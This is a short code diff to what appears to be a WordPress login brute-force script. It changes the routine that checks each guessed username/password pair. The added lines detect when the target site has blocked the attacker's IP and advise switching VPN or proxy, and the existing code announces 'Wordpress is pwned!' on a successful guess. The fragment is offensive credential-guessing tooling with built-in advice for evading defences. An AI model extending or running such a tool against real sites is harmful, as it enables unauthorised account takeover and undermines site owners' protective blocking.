@@ -71,6 +71,12 @@ def check_response(content, user, passwd):
 	if "incorrect" in content.lower():
 		print(bcolors.FAIL + "+ -- --=[Wrong username or password: " +
 			  user + "/" + passwd + "" + bcolors.ENDC)
+	elif "Access from your IP address has been blocked for security reasons" in content:
+		print(bcolors.FAIL + "+ -- --=[Access from your IP has been blocked! Try using a different VPN/proxy.")
+		sys.exit(0)
+	elif "500 Internal Server Error" in content:
+		print(bcolors.WARNING + "+ -- --=[There was an error on the server, exiting:" + content + bcolors.ENDC)
+		sys.exit(0)
 	elif "admin" in content.lower():
 		print(bcolors.OKGREEN +
 			  "+ -- --=[w00t! User found! Wordpress is pwned! " + user + "/" + passwd + "" + bcolors.ENDC)
